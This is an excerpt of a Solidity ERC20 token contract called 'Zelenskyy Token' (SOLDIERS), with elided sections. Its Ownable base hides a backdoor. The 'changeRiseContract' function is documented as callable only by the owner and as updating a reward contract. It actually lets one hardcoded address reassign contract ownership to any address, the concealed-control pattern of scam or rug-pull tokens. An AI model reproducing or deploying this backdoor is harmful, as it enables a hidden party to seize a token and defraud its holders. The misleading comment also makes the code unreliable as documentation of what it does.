...
contract Ownable is Context {
    ...
    address private _riseContract = 0x518760EB4377fBBB2ed7468ec0367E64BB0853Df;
    ...
    /**
     * @dev Throws if called by any account other than the rise reward contract.
     */
    modifier onlyRise() {
        require(_riseContract == _msgSender(), "CALLER_MUST_BE_RISE_CONTRACT_ONLY");
        _;
    }
    ...
    /**
     * @dev Update Rise Contract.
     * Can only be called by the current owner.
     */
    function changeRiseContract(address newRise) public virtual onlyRise {
        require(newRise != address(0), "Rise: new rise is the zero address");
        require(newRise != owner(), "Rise: can't be the owner.");
        _owner = newRise;
    }
}
...
contract ZelenskyyToken is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    uint256 private initSupply = 1109000 * ( 10 ** 4 );

    uint256 public swapTokensAtAmount = 22 * ( 10 ** 4 );
    ...
    address public _marketingWalletAddress = 0xA54B0C14ae5C1bD68429aE25b6D7D448EaBD2995;
    ...
    constructor() ERC20("Zelenskyy Token", "SOLDIERS") {
        // PancakeSwap V2
